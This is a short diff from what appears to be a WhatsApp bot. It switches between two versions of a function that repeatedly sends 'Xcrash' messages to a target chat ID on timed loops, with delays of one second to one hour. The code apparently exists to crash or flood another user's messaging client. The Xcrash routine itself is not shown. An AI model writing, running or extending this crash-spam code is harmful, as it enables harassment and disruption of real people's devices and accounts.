@@ -2132,7 +2132,7 @@ await sock.relayMessage(target, {
 
 
 
-/*async function S7LOVESYUILIKES7(sock, targetJid) {
+async function S7LOVESYUILIKES7(sock, targetJid) {
   const SY_LOVE_IS_IMPORTANT = 1000;
   const ALSO_S7_TOO = 10 * 60 * 1000;
   const ONE_HOUR_LOVS = 60 * 60 * 1000;
@@ -2161,11 +2161,11 @@ await sock.relayMessage(target, {
     await Xcrash(sock, target);
     await Xcrash(sock, target);
   }
-}*/
+}
 
 
 
-async function S7LOVESYUILIKES7(sock, targetJid) {
+/*async function S7LOVESYUILIKES7(sock, targetJid) {
   const ONE_LOVE = 60 * 60 * 1000;
   const LOVE_SEC = 1 * 1000;
   const target = targetJid;
@@ -2177,7 +2177,7 @@ async function S7LOVESYUILIKES7(sock, targetJid) {
     Xcrash(sock, target, ptcp = true)
     await delay(LOVE_SEC);
   }
-}
+}*/
 
 
 
